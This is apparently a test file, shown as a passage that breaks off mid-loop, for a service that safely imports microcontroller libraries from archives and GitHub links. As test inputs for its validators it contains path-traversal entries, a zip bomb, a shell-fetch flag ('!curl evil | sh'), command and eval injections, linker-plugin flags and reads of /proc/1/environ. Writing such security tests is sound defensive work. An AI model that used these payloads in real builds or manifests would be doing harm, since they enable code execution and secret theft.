/**
 * Libraries: reading archives safely, what an import keeps, what the
 * catalogue refuses, versions, GitHub links, storage, which libraries a build
 * uses, and the routes end to end. Archives are built here, byte by byte, so
 * every hostile shape can be tried without the network.
 */
import fs from "fs";
import os from "os";
import path from "path";
import zlib from "zlib";
import http from "http";
import express from "express";
import { readZip, readTarGz, cleanArchivePath, ArchiveError } from "../server/archive.ts";
import {
  findLibraryRoot, sanitizeLibrary, isKeptImportPath, auditPackage, isSafeFlag, isSubstSafe, satisfies, pickVersion,
  parseGithubUrl, apiSummary, headerKey, includedHeaderKeys, folderNameFor, nameFromFolder, LibraryError,
} from "../server/libraryManifest.ts";
import {
  setLibrariesRoot, saveImported, listLibraries, removeLibrary, prepareLibraries, planLibraries, mergeLibDeps,
  unpackZipLibrary, missingLibraryHint, libraryNoteFor, registerLibraryRoutes, MAX_LIBRARIES, NO_LIBRARIES,
} from "../server/libraries.ts";
import { detectLibDeps, isBuiltinHeader, knownLibraryHeader } from "../server/libraryDeps.ts";
import { buildEnv } from "../server/buildEnv.ts";

let bad = 0;
const check = (cond, label, extra = "") => {
  if (!cond) bad++;
  console.log(`  ${cond ? "ok  " : "FAIL"}  ${label}${extra ? "  " + extra : ""}`);
};
const throws = (fn, match, label) => {
  try { fn(); check(false, label, "(did not throw)"); } catch (err) {
    check(match.test(String(err?.message)), label, match.test(String(err?.message)) ? "" : `(${err?.message})`);
  }
};
const LIMITS = { maxFiles: 3000, maxFileBytes: 2 * 1024 * 1024, maxTotalBytes: 20 * 1024 * 1024 };

// --- a tiny zip writer -------------------------------------------------------
const CRC_TABLE = Array.from({ length: 256 }, (_, n) => {
  let c = n;
  for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
  return c >>> 0;
});
const crc32 = (buf) => {
  let c = 0xffffffff;
  for (const b of buf) c = CRC_TABLE[(c ^ b) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
};
/** files: { name, data?, method?(0|8), unixMode?, flags?, claimSize? } */
function makeZip(files, comment = "") {
  const locals = [];
  const centrals = [];
  let offset = 0;
  for (const f of files) {
    const name = Buffer.from(f.name);
    const data = Buffer.from(f.data ?? "");
    const method = f.method ?? 8;
    const stored = method === 8 ? zlib.deflateRawSync(data) : data;
    const size = f.claimSize ?? data.length;
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(f.flags ?? 0, 6);
    local.writeUInt16LE(method, 8);
    local.writeUInt32LE(crc32(data), 14);
    local.writeUInt32LE(stored.length, 18);
    local.writeUInt32LE(size, 22);
    local.writeUInt16LE(name.length, 26);
    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(f.unixMode !== undefined ? (3 << 8) | 20 : 20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(f.flags ?? 0, 8);
    central.writeUInt16LE(method, 10);
    central.writeUInt32LE(crc32(data), 16);
    central.writeUInt32LE(stored.length, 20);
    central.writeUInt32LE(size, 24);
    central.writeUInt16LE(name.length, 28);
    central.writeUInt32LE(f.unixMode !== undefined ? (f.unixMode << 16) >>> 0 : 0, 38);
    central.writeUInt32LE(offset, 42);
    locals.push(local, name, stored);
    centrals.push(central, name);
    offset += 30 + name.length + stored.length;
  }
  const cd = Buffer.concat(centrals);
  const c = Buffer.from(comment);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(files.length, 8);
  eocd.writeUInt16LE(files.length, 10);
  eocd.writeUInt32LE(cd.length, 12);
  eocd.writeUInt32LE(offset, 16);
  eocd.writeUInt16LE(c.length, 20);
  return Buffer.concat([...locals, cd, eocd, c]);
}

// --- a tiny tar.gz writer ----------------------------------------------------
function tarHeader(name, size, type = "0", prefix = "") {
  const h = Buffer.alloc(512);
  h.write(name.slice(0, 100), 0);
  h.write("0000644\0", 100);
  h.write("0000000\0", 108);
  h.write("0000000\0", 116);
  h.write(size.toString(8).padStart(11, "0") + "\0", 124);
  h.write("00000000000\0", 136);
  h.write("        ", 148);
  h.write(type, 156);
  h.write("ustar\0", 257);
  h.write("00", 263);
  if (prefix) h.write(prefix, 345);
  let sum = 0;
  for (const b of h) sum += b;
  h.write(sum.toString(8).padStart(6, "0") + "\0 ", 148);
  return h;
}
const pad = (buf) => Buffer.concat([buf, Buffer.alloc((512 - (buf.length % 512)) % 512)]);
/** entries: { name, data?, type?, prefix?, longName?, paxPath? } */
function makeTarGz(entries) {
  const parts = [];
  for (const e of entries) {
    const data = Buffer.from(e.data ?? "");
    if (e.longName) {
      const ln = Buffer.from(e.longName + "\0");
      parts.push(tarHeader("././@LongLink", ln.length, "L"), pad(ln));
    }
    if (e.paxPath) {
      let rec = ` path=${e.paxPath}\n`;
      let len = rec.length + 2;
      len = rec.length + String(len).length;
      const body = Buffer.from(`${len}${rec}`);
      parts.push(tarHeader("PaxHeader", body.length, "x"), pad(body));
    }
    parts.push(tarHeader(e.name, data.length, e.type ?? "0", e.prefix ?? ""), pad(data));
  }
  parts.push(Buffer.alloc(1024));
  return zlib.gzipSync(Buffer.concat(parts));
}

// =============================================================================
console.log("Archive paths");
check(cleanArchivePath("a/b/c.h") === "a/b/c.h", "a plain path stays");
check(cleanArchivePath("./a//b\\c.h") === "a/b/c.h", "dots, doubled and back slashes are tidied");
check(cleanArchivePath("../evil.h") === null, "a path climbing out is refused");
check(cleanArchivePath("a/../../evil.h") === null, "a path climbing out from inside is refused");
check(cleanArchivePath("/etc/passwd") === null, "an absolute path is refused");
check(cleanArchivePath("C:/x.h") === null, "a drive letter is refused");

console.log("Reading a zip");
{
  const zip = makeZip([
    { name: "Lib-HEAD/" },
    { name: "Lib-HEAD/library.properties", data: "name=Lib\nversion=1.0.0\n" },
    { name: "Lib-HEAD/src/Lib.h", data: "class Lib { public: void begin(); };" },
    { name: "Lib-HEAD/src/Lib.cpp", data: "#include \"Lib.h\"\nvoid Lib::begin() {}\n", method: 0 },
    { name: "Lib-HEAD/link.h", data: "/etc/passwd", unixMode: 0o120777 },
    { name: "../escape.h", data: "x" },
  ], "f7d625462e6033f373e51f8c67f88fc429535b47");
  const all = readZip(zip, LIMITS, () => true);
  check(all.allPaths.join(",") === "Lib-HEAD/library.properties,Lib-HEAD/src/Lib.h,Lib-HEAD/src/Lib.cpp", "files only: no folders, links or climbing paths", all.allPaths.join(","));
  check(all.entries.find((e) => e.path.endsWith("Lib.cpp"))?.data.toString().includes("Lib::begin"), "stored and deflated entries both read back");
  check(readZip(zip, LIMITS, () => false).entries.length === 0, "a listing reads nothing it wasn't asked for");
  throws(() => readZip(Buffer.from("not a zip at all"), LIMITS, () => true), /isn't a zip/, "not a zip");
  throws(() => readZip(makeZip([{ name: "a.h", data: "x", flags: 1 }]), LIMITS, () => true), /password/, "a password-protected zip is refused");
  throws(() => readZip(makeZip([{ name: "a.h", data: "x".repeat(5000), claimSize: 10 }]), LIMITS, () => true), /bigger than the zip says|damaged/, "an entry bigger than it claims stops at the claim");
  throws(() => readZip(makeZip([{ name: "a.h", data: "x".repeat(100) }]), { ...LIMITS, maxFileBytes: 50 }, () => true), /larger than/, "a file over the per-file limit");
  throws(() => readZip(makeZip([{ name: "a.h", data: "x" }, { name: "b.h", data: "y" }]), { ...LIMITS, maxFiles: 1 }, () => true), /more than 1 code files/, "too many files");
  throws(() => readZip(makeZip([{ name: "a.h", data: "x".repeat(60) }, { name: "b.h", data: "y".repeat(60) }]), { ...LIMITS, maxTotalBytes: 100 }, () => true), /larger than/, "too much in total");
  const bomb = makeZip([{ name: "bomb.h", data: Buffer.alloc(8 * 1024 * 1024) }]);
  throws(() => readZip(bomb, LIMITS, () => true), /larger than 2 MB/, `an 8 MB file in a ${Math.round(bomb.length / 1024)} KB zip is refused before inflating`);
  check(readZip(bomb, LIMITS, () => false).allPaths.length === 1, "and a listing of it costs nothing");
}

console.log("Reading a tar.gz");
{
  const long = "pkg/" + "deep/".repeat(30) + "Long.h";
  const tgz = makeTarGz([
    { name: "library.json", data: '{"name":"Pkg"}' },
    { name: "Pkg.h", data: "class Pkg {};", prefix: "src" },
    { name: "ignored-name", data: "long", longName: long },
    { name: "pax-name", data: "pax", paxPath: "src/Pax.h" },
    { name: "src/link.h", type: "2" },
    { name: "../../escape.h", data: "x" },
  ]);
  const t = readTarGz(tgz, LIMITS, () => true);
  check(t.allPaths.join(",") === `library.json,src/Pkg.h,${long},src/Pax.h`, "ustar prefixes, long names and pax paths; no links or climbing paths", t.allPaths.join(","));
  check(t.entries.find((e) => e.path === "src/Pax.h")?.data.toString() === "pax", "contents follow the right names");
  throws(() => readTarGz(Buffer.from("nope"), LIMITS, () => true), /couldn't be unpacked/, "not a tar.gz");
  throws(() => readTarGz(makeTarGz([{ name: "big.h", data: "x".repeat(4096) }]), LIMITS, () => true, 1024), /larger than/, "the unpacked size is capped while unpacking");
}

console.log("Where the library is");
{
  const gh = ["Repo-HEAD/README.md", "Repo-HEAD/library.properties", "Repo-HEAD/src/Repo.h", "Repo-HEAD/examples/Demo/library.json", "Repo-HEAD/examples/Demo/Demo.ino"];
  check(findLibraryRoot(gh) === "Repo-HEAD", "a GitHub download: its top folder, ignoring manifests in examples");
  check(findLibraryRoot(["library.json", "src/X.h"]) === "", "a catalogue package: the archive's root");
  check(findLibraryRoot(["wrap/inner/Plain.h", "wrap/inner/Plain.cpp"]) === "wrap/inner", "no manifest: down through single folders");
  throws(() => findLibraryRoot(["top/A/library.properties", "top/A/A.h", "top/B/library.properties", "top/B/B.h"]), /holds 2 libraries \(A, B\)/, "two libraries side by side are named");
  const mono = ["mono-main/libs/A/library.properties", "mono-main/libs/A/A.h", "mono-main/libs/B/library.properties", "mono-main/libs/B/B.h"];
  check(findLibraryRoot(mono, "libs/B") === "mono-main/libs/B", "a folder link picks one, under the download's own top folder");
  check(findLibraryRoot(mono, "mono-main/libs/A") === "mono-main/libs/A", "or with the top folder already in it");
  throws(() => findLibraryRoot(mono, "libs/C"), /no folder "libs\/C"/, "a folder that isn't there");
  throws(() => findLibraryRoot(["docs/readme.md", "pic.png"]), /no header/, "no headers, no library");
}

console.log("What an import keeps");
{
  const entries = [
    ["L-main/library.json", JSON.stringify({
      name: "Weather Thing", version: "2.1.0", description: "d",
      build: { extraScript: "evil.py", flags: ["-DFOO=1", "-Isrc/inc"], srcDir: "src" },
      dependencies: { "adafruit/Adafruit Unified Sensor": "^1.1" },
    })],
    ["L-main/library.properties", "name=Weather Thing\nversion=2.1.0\narchitectures=*\nldflags=-Wl,--plugin=/tmp/x.so\nprecompiled=true\ndepends=Adafruit Unified Sensor\nincludes=Weather.h\n"],
    ["L-main/src/Weather.h", "#include <Adafruit_Sensor.h>\n#include <Wire.h>\n#include \"util/helpers.h\"\nclass Weather { public: Weather(int pin); bool begin(); float temperature() const; private: int _pin; };"],
    ["L-main/src/Weather.cpp", "#include \"Weather.h\"\n"],
    ["L-main/src/util/helpers.h", "int helper();"],
    ["L-main/src/a;id;.cpp", "int x;"],
    ["L-main/src/$(evil).cpp", "int y;"],
    ["L-main/src/precompiled/libweather.a", "binary"],
    ["L-main/evil.py", "import os"],
    ["L-main/examples/Demo/Demo.ino", "void setup(){}"],
    ["L-main/test/test.cpp", "int t;"],
    ["L-main/.github/workflows/ci.yml", "x"],
    ["L-main/keywords.txt", "Weather KEYWORD1"],
  ].map(([p, d]) => ({ path: p, data: Buffer.from(d) }));
  const lib = sanitizeLibrary(entries, "L-main", "fallback");
  const kept = lib.files.map((f) => f.path).sort();
  check(JSON.stringify(kept) === JSON.stringify(["keywords.txt", "library.json", "library.properties", "src/Weather.cpp", "src/Weather.h", "src/util/helpers.h"]), "only code, headers and manifests; no scripts, binaries, examples, tests or odd names", kept.join(","));
  const json = JSON.parse(lib.files.find((f) => f.path === "library.json").data.toString());
  check(!("extraScript" in (json.build || {})) && !("dependencies" in json), "library.json loses its script and dependencies");
  check(JSON.stringify(json.build.flags) === JSON.stringify(["-DFOO=1", "-Isrc/inc"]) && json.build.srcDir === "src", "and keeps its safe build settings");
  const props = lib.files.find((f) => f.path === "library.properties").data.toString();
  check(!/ldflags|precompiled|depends/.test(props) && /includes=Weather.h/.test(props), "library.properties loses its link flags, precompiled parts and dependencies", JSON.stringify(props));
  check(lib.name === "Weather Thing" && lib.version === "2.1.0" && lib.folder === "Weather_Thing", "name, version and folder", `${lib.name} ${lib.version} ${lib.folder}`);
  check(lib.headers.includes("Weather") && lib.headers.includes("helpers"), "headers are known by the key the build uses");
  check(lib.headerFiles[0] === "Weather.h", "Weather.h is the header to include", lib.headerFiles.join(","));
  check(lib.includes.includes("Adafruit_Sensor") && lib.includes.includes("Wire") && !lib.includes.includes("helpers"), "what it includes from elsewhere, not its own headers", lib.includes.join(","));
  check(/class Weather \{ Weather\(int pin\); bool begin\(\); float temperature\(\) const; \}/.test(lib.summary), "its API, public part only", lib.summary);
  check(lib.notes.some((n) => /script was left out/.test(n)), "the dropped script is mentioned");
  check(lib.notes.some((n) => /precompiled parts/.test(n)), "the dropped precompiled part is mentioned");
  check(lib.notes.some((n) => /2 files were left out/.test(n)), "the two odd file names are mentioned");
  check(lib.skipped === 2, "and counted");

  const bad = sanitizeLibrary([
    { path: "library.json", data: Buffer.from(JSON.stringify({ name: "X", build: { flags: "!curl evil | sh", srcFilter: "+<${__import__('os').system('id')}>", includeDir: "../../etc" } })) },
    { path: "X.h", data: Buffer.from("") },
  ], "", "X");
  const badJson = JSON.parse(bad.files.find((f) => f.path === "library.json").data.toString());
  check(!badJson.build, "commands, evaluated expressions and climbing paths never reach the build", JSON.stringify(badJson));
  check(bad.notes.some((n) => /build settings were left out/.test(n)), "and that is mentioned");

  const bare = sanitizeLibrary([{ path: "Bare-master/Bare.h", data: Buffer.from("struct Bare { int read(); };") }], "Bare-master", "zipname");
  check(bare.name === "Bare" && bare.files.some((f) => f.path === "library.json"), "no manifest: named from its folder and given the plainest one", bare.name);
  check(nameFromFolder("DHT-sensor-library-HEAD") === "DHT-sensor-library" && nameFromFolder("Foo-v1.2.3") === "Foo", "download folder suffixes are dropped");
  check(folderNameFor("../../x y") === "x_y" && folderNameFor("$$$") === "library", "folder names are plain");
  throws(() => sanitizeLibrary([{ path: "readme.md", data: Buffer.from("") }, { path: "a.cpp", data: Buffer.from("") }], "", "x"), /no header/, "no headers kept, no library");
  check(isKeptImportPath("L/src/a.cpp", "L") && !isKeptImportPath("L/examples/x/a.cpp", "L") && !isKeptImportPath("M/a.cpp", "L"), "kept paths are inside the root and outside examples");
}

console.log("Build settings");
{
  for (const f of ["-DFOO", "-DFOO=1", "-DNAME=\"abc\"", "-DLIST=1,2", "-UFOO", "-Isrc", "-Iinclude/sub", "-I$PROJECT_INCLUDE_DIR", "-std=gnu++17", "-O2", "-Os", "-g", "-Wall", "-Wno-unused-variable", "-Wno-error=deprecated", "-fno-exceptions", "-mlongcalls", "-mfpu=fpv4-sp-d16", "-lm", "-Llib"]) {
    check(isSafeFlag(f), `allowed: ${f}`);
  }
  for (const f of ["!echo hi", "-DX=$(id)", "-DX=${__import__('os')}", "-DX=`id`", "-DX=a;id", "-DX='a", "-DX=a\\b", "-I/etc", "-I../../x", "-Wl,--plugin=x.so", "-Wa,x", "-Wp,x", "-fplugin=x.so", "-fuse-ld=/tmp/ld", "-B/tmp", "-specs=x", "-include/proc/1/environ", "@/proc/1/environ", "-Xlinker", "--plugin", "-wrapper", "-DX=$x.y", "-D$$"]) {
    check(!isSafeFlag(f), `refused: ${f}`);
  }
  check(isSubstSafe("$PROJECT_DIR/x") && !isSubstSafe("${x}") && !isSubstSafe("$(x)") && !isSubstSafe("$a.b") && !isSubstSafe("$$") && !isSubstSafe("$"), "only plain $VARIABLES pass");
}

console.log("The catalogue: accept or refuse");
{
  const ok = auditPackage(["library.json", "src/A.h", "src/A.cpp"], { json: JSON.stringify({ name: "A", build: { flags: "-DA=1" }, dependencies: [{ owner: "adafruit", name: "Adafruit BusIO", version: "^1.14" }] }) }, "");
  check(!ok.refusals.length && ok.dependencies[0].owner === "adafruit" && ok.dependencies[0].requirement === "^1.14", "a plain library passes, with its dependency", JSON.stringify(ok));
  const cases = [
    [{ json: JSON.stringify({ build: { extraScript: "pre.py" } }) }, /build script/, "a build script"],
    [{ json: JSON.stringify({ scripts: { postinstall: "x" } }) }, /build script/, "an install script"],
    [{ json: JSON.stringify({ build: { flags: ["!python evil.py"] } }) }, /build settings/, "a command flag"],
    [{ json: JSON.stringify({ build: { srcFilter: "+<${x}>" } }) }, /build settings/, "an evaluated filter"],
    [{ json: JSON.stringify({ build: { includeDir: "/etc" } }) }, /build settings/, "an absolute include folder"],
    [{ json: JSON.stringify({ build: { builder: "os" } }) }, /custom builder/, "a custom builder"],
    [{ json: JSON.stringify({ dependencies: { foo: "https://evil.example/foo.zip" } }) }, /outside the catalogue/, "a dependency from a URL"],
    [{ json: JSON.stringify({ dependencies: [{ name: "git+https://github.com/x/y" }] }) }, /outside the catalogue/, "a dependency from git"],
    [{ json: "{not json" }, /can't be read/, "an unreadable manifest"],
    [{ properties: "name=P\nldflags=-Wl,--plugin=x.so\n" }, /link settings/, "link flags in library.properties"],
  ];
  for (const [manifests, re, label] of cases) {
    const a = auditPackage(["library.json", "A.h"], manifests, "");
    check(a.refusals.some((r) => re.test(r)), `refused: ${label}`, a.refusals.join("; "));
  }
  check(auditPackage(["A.h", "src/a;b.cpp"], {}, "").refusals.some((r) => /names that aren't allowed/.test(r)), "refused: a code file whose name would run a command");
  check(!auditPackage(["A.h", "docs/My Guide (v2).pdf", "src/a b.cpp"], {}, "").refusals.length, "spaces, and odd names outside code, are fine");
  check(!auditPackage(["A.h"], { properties: "name=P\nldflags=-lalgobsec\n" }, "").refusals.length, "a plain -l link flag is fine");
  const legacy = auditPackage(["A.h"], { json: JSON.stringify({ dependencies: { name: "OneWire", version: "2.3" } }) }, "");
  check(legacy.dependencies.length === 1 && legacy.dependencies[0].name === "OneWire", "the legacy single-dependency form");
  const obj = auditPackage(["A.h"], { json: JSON.stringify({ dependencies: { "paulstoffregen/OneWire": "^2.3" } }) }, "");
  check(obj.dependencies[0].owner === "paulstoffregen" && obj.dependencies[0].name === "OneWire", "owner/name keys");
  const props = auditPackage(["A.h"], { properties: "name=P\ndepends=Adafruit GFX Library (>=1.10), Adafruit BusIO\n" }, "");
  check(props.dependencies.length === 2 && props.dependencies[0].requirement === ">=1.10" && props.dependencies[1].name === "Adafruit BusIO", "library.properties depends=", JSON.stringify(props.dependencies));
}

console.log("Versions");
{
  const table = [
    ["1.4.6", "^1.4.6", true], ["1.9.0", "^1.4.6", true], ["2.0.0", "^1.4.6", false], ["1.4.5", "^1.4.6", false],
    ["0.2.5", "^0.2.3", true], ["0.3.0", "^0.2.3", false], ["0.0.3", "^0.0.3", true], ["0.0.4", "^0.0.3", false],
    ["1.2.9", "~1.2.3", true], ["1.3.0", "~1.2.3", false], ["1.9.0", "~1", true],
    ["1.5.0", ">=1.0,<2", true], ["2.0.0", ">=1.0,<2", false], ["1.5.0", ">= 1.0 < 2", true],
    ["1.2.3", "1.2.3", true], ["1.2.4", "1.2.3", false], ["1.2.9", "1.2", true], ["1.3.0", "1.2", false],
    ["1.7.0", "1.x", true], ["3.0.0", "*", true], ["3.0.0", "", true], ["1.3.0", "~=1.2", true], ["2.0.0", "~=1.2", false],
    ["1.0.0", "!=1.0.0", false], ["v1.2.0", "^1.1", true],
  ];
  for (const [v, r, want] of table) check(satisfies(v, r) === want, `${v} ${want ? "meets" : "misses"} "${r}"`);
  check(satisfies("1.0.0", "latest-ish?") === null, "a requirement that isn't understood says so");
  check(pickVersion(["1.0.0", "1.4.6", "2.0.1", "1.10.0"], "^1.0") === "1.10.0", "the newest that fits, compared as numbers");
  check(pickVersion(["1.0.0", "2.0.0"], "garbage!") === "2.0.0", "the newest when the requirement isn't understood");
  check(pickVersion(["1.0.0"], "^2") === null, "none when nothing fits");
}

console.log("GitHub links");
{
  const cases = [
    ["https://github.com/adafruit/DHT-sensor-library", "adafruit", "DHT-sensor-library", null, null],
    ["github.com/adafruit/DHT-sensor-library.git", "adafruit", "DHT-sensor-library", null, null],
    ["git@github.com:adafruit/DHT-sensor-library.git", "adafruit", "DHT-sensor-library", null, null],
    ["https://github.com/o/r/tree/main/libs/Thing", "o", "r", "main", "libs/Thing"],
    ["https://github.com/o/r/blob/dev/src/Thing.h", "o", "r", "dev", "src"],
    ["https://github.com/o/r/releases/tag/v1.2.0", "o", "r", "v1.2.0", null],
    ["https://github.com/o/r/archive/refs/heads/main.zip", "o", "r", "main", null],
    ["https://github.com/o/r/archive/refs/tags/v2.zip", "o", "r", "v2", null],
    ["https://github.com/o/r/commit/abc123", "o", "r", "abc123", null],
    ["https://github.com/o/r/issues/5", "o", "r", null, null],
  ];
  for (const [url, owner, repo, ref, sub] of cases) {
    const g = parseGithubUrl(url);
    const c = g?.candidates[0];
    check(g && g.owner === owner && g.repo === repo && c.ref === ref && c.subpath === sub, url, JSON.stringify(g));
  }
  const branch = parseGithubUrl("https://github.com/o/r/tree/feature/x/src");
  check(branch.candidates.map((c) => `${c.ref}|${c.subpath}`).join(" ") === "feature|x/src feature/x|src feature/x/src|null", "a branch name with a slash is tried each way", JSON.stringify(branch.candidates));
  for (const url of ["https://gitlab.com/o/r", "https://github.com/o", "https://evil.com/github.com/o/r", "https://github.com/o/r/tree/..%2F..%2Fetc", "https://github.com/-bad/r", "not a url at all", "https://github.com/o/r/tree/main/a%2F..%2F..%2Fx"]) {
    check(parseGithubUrl(url) === null, `refused: ${url}`);
  }
}

console.log("Headers and includes");
check(headerKey("DHT.h") === "DHT" && headerKey("utility/twi.h") === "twi" && headerKey("Foo.hpp") === "Foo.hpp", "the same header key as automatic detection");
check(includedHeaderKeys('#include <DHT.h>\n#include "My Lib.h"\n  #  include <Wire.h>').join(",") === "DHT,My Lib,Wire", "includes in the code");
{
  const box = apiSummary(["enum class Mode { A, B };\ntemplate <typename T> class Box { public: T get() const { return v; } IRAM_ATTR void set(T x) { v = x; } private: T v; };"]);
  check(box === "class Box { T get() const; void set(T x); }", "enum classes skipped; inline bodies cut to the signature; attribute macros dropped", box);
}

console.log("Which libraries a build uses");
{
  const imported = (name, headers, includes = [], folder = name) => ({ id: "a".repeat(12), kind: "zip", name, version: "", folder, headers, headerFiles: headers.map((h) => `${h}.h`), includes, summary: "", bytes: 1, files: 1, notes: [], addedAt: 0 });
  const cat = (name, spec, headers) => ({ id: "b".repeat(12), kind: "catalogue", owner: spec.split("/")[0], name, version: spec.split("@")[1], spec, headers, headerFiles: [], summary: "", addedAt: 0 });
  const myDht = imported("MyDHT", ["DHT"], ["Adafruit_Sensor", "Wire", "MyUtil"]);
  const util = imported("MyUtil", ["MyUtil"]);
  const unused = imported("Unused", ["Nope"]);
  const pinned = cat("DHT sensor library", "adafruit/DHT sensor library@1.4.4", ["DHT", "DHT_U"]);
  const json = cat("ArduinoJson", "bblanchon/ArduinoJson@7.0.0", ["ArduinoJson"]);
  const plan = planLibraries([myDht, util, unused, pinned, json], ["Arduino", "DHT", "ArduinoJson"]);
  check(plan.imported.map((l) => l.name).join(",") === "MyDHT,MyUtil", "an included import, and the import it includes in turn; not the unused one", plan.imported.map((l) => l.name).join(","));
  check(plan.libDeps.join(",") === "bblanchon/ArduinoJson@7.0.0", "an import wins over a catalogue library for the same header", plan.libDeps.join(","));
  check(plan.skipHeaders.has("DHT") && plan.skipHeaders.has("ArduinoJson") && !plan.skipHeaders.has("Adafruit_Sensor"), "automatic detection leaves their headers alone");
  check(plan.extraIncludes === "\n#include <Adafruit_Sensor.h>", "a well-known library an import needs is still found automatically", JSON.stringify(plan.extraIncludes));
  const shadow = planLibraries([imported("MyWire", ["Wire"])], ["Wire"]);
  check(!shadow.imported.length, "an import can't take over a header the board provides");

  const code = "#include <Arduino.h>\n#include <DHT.h>\n#include <ArduinoJson.h>\n#include <SomethingNew.h>\n";
  const deps = mergeLibDeps(plan.libDeps, detectLibDeps(code + plan.extraIncludes, plan.skipHeaders));
  check(JSON.stringify(deps) === JSON.stringify(["bblanchon/ArduinoJson@7.0.0", "SomethingNew", "adafruit/Adafruit Unified Sensor@^1.1.14"]), "the build's library list", JSON.stringify(deps));
  const dup = mergeLibDeps(["adafruit/Adafruit Unified Sensor@1.1.4"], ["adafruit/DHT sensor library@^1.4.6", "adafruit/Adafruit Unified Sensor@^1.1.14"]);
  check(JSON.stringify(dup) === JSON.stringify(["adafruit/Adafruit Unified Sensor@1.1.4", "adafruit/DHT sensor library@^1.4.6"]), "a pinned version replaces the automatic one", JSON.stringify(dup));

  // With no libraries of the user's, a build's list is exactly what it always was.
  const samples = [
    "#include <Arduino.h>\n#include <DHT.h>\n#include <Wire.h>\n",
    "#include <WiFi.h>\n#include <PubSubClient.h>\n#include <ArduinoJson.h>\n#include \"Custom.h\"\n",
    "#include <Adafruit_SSD1306.h>\n#include <Adafruit_GFX.h>\n#include <SPI.h>\n#include <Servo.h>\n",
    "void setup(){}\nvoid loop(){}\n",
  ];
  for (const s of samples) {
    const before = JSON.stringify(detectLibDeps(s));
    check(JSON.stringify(mergeLibDeps(NO_LIBRARIES.libDeps, detectLibDeps(s + NO_LIBRARIES.extraIncludes, NO_LIBRARIES.skipHeaders))) === before, `unchanged without user libraries: ${s.split("\n")[0].slice(0, 40)}`);
  }
  check(isBuiltinHeader("Wire") && isBuiltinHeader("WiFi") && !isBuiltinHeader("DHT") && knownLibraryHeader("DHT") && !knownLibraryHeader("Wire"), "built-in and well-known headers");
}

console.log("When a build is missing a library");
check(/“Foo\.h” wasn't found.*Libraries/.test(missingLibraryHint("src/main.cpp:3:10: fatal error: Foo.h: No such file or directory")), "a missing header");
check(/No library called “Foo”/.test(missingLibraryHint("Error: Could not find the package with 'Foo' requirements for your system 'linux_x86_64'")), "a library the catalogue doesn't have");
check(missingLibraryHint("error: expected ';' before '}' token") === null, "an ordinary error has no hint");

console.log("The build's environment");
{
  const env = buildEnv("/app/.platformio", {
    PATH: "/usr/bin", HOME: "/root", LANG: "C.UTF-8", LC_ALL: "C.UTF-8", https_proxy: "http://p", Path: "C:\\x",
    GEMINI_API_KEY: "g", DEEPSEEK_API_KEY: "d", PAYSTACK_SECRET_KEY: "p", ADMIN_PASSWORD: "a", FIREBASE_SERVICE_ACCOUNT: "{}",
    GITHUB_CLIENT_SECRET: "s", PLATFORMIO_AUTH_TOKEN: "t", PLATFORMIO_CORE_DIR: "/old", PLATFORMIO_SETTING_ENABLE_TELEMETRY: "No",
  });
  check(env.PATH === "/usr/bin" && env.HOME === "/root" && env.LANG && env.LC_ALL && env.https_proxy && env.Path, "system basics and proxies pass");
  check(!["GEMINI_API_KEY", "DEEPSEEK_API_KEY", "PAYSTACK_SECRET_KEY", "ADMIN_PASSWORD", "FIREBASE_SERVICE_ACCOUNT", "GITHUB_CLIENT_SECRET", "PLATFORMIO_AUTH_TOKEN"].some((k) => k in env), "no secret reaches a build");
  check(env.PLATFORMIO_CORE_DIR === "/app/.platformio" && env.PLATFORMIO_SETTING_ENABLE_TELEMETRY === "No", "the compiler's own settings pass, with its folder set");
}

console.log("Storage");
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "libs-test-"));
setLibrariesRoot(tmp);
try {
  const zip = makeZip([
    { name: "Thing-main/library.properties", data: "name=Thing\nversion=0.3.0\n" },
    { name: "Thing-main/src/Thing.h", data: "#include <Wire.h>\nclass Thing { public: void go(); };" },
    { name: "Thing-main/src/Thing.cpp", data: "#include \"Thing.h\"\nvoid Thing::go() {}" },
    { name: "Thing-main/examples/Go/Go.ino", data: "void setup(){}" },
  ]);
  const lib = unpackZipLibrary(zip, null, "upload");
  const saved = await saveImported("user_1", lib, "zip");
  check(listLibraries("user_1").length === 1 && saved.folder === "Thing", "an import is stored for the account");
  check(fs.existsSync(path.join(tmp, "users", "user_1", "files", saved.id, "src", "Thing.h")), "its files are on disk");
  check(!fs.existsSync(path.join(tmp, "users", "user_1", "files", saved.id, "examples")), "without its examples");
  const again = await saveImported("user_1", unpackZipLibrary(zip, null, "upload"), "zip");
  check(listLibraries("user_1").length === 1 && again.id !== saved.id && !fs.existsSync(path.join(tmp, "users", "user_1", "files", saved.id)), "importing it again replaces it");

  const buildDir = fs.mkdtempSync(path.join(os.tmpdir(), "build-test-"));
  const used = prepareLibraries("user_1", "#include <Thing.h>\nvoid setup(){}", buildDir);
  check(fs.existsSync(path.join(buildDir, "lib", "Thing", "src", "Thing.cpp")) && used.used.join() === "Thing", "a build that includes it gets it in lib/");
  const notUsed = fs.mkdtempSync(path.join(os.tmpdir(), "build-test-"));
  prepareLibraries("user_1", "void setup(){}", notUsed);
  check(!fs.existsSync(path.join(notUsed, "lib")), "a build that doesn't, doesn't");
  check(prepareLibraries("someone_else", "#include <Thing.h>", notUsed) === NO_LIBRARIES, "another account doesn't have it");
  check(prepareLibraries("../../etc", "#include <Thing.h>", notUsed) === NO_LIBRARIES, "an odd account id reads nothing");
  fs.rmSync(buildDir, { recursive: true, force: true });
  fs.rmSync(notUsed, { recursive: true, force: true });

  const note = libraryNoteFor("user_1");
  check(/Thing 0\.3\.0 \(imported\): #include <Thing\.h>/.test(note) && /class Thing \{ void go\(\); \}/.test(note), "the agent is told about it", note);
  check(/Libraries \(the Libraries button above main\.cpp\)/.test(libraryNoteFor(undefined)), "and always told where libraries are added");

  for (let i = 0; i < MAX_LIBRARIES - 1; i++) {
    const z = makeZip([{ name: `L${i}/L${i}.h`, data: "int x;" }]);
    await saveImported("user_1", unpackZipLibrary(z, null, `L${i}`), "zip");
  }
  let refused = null;
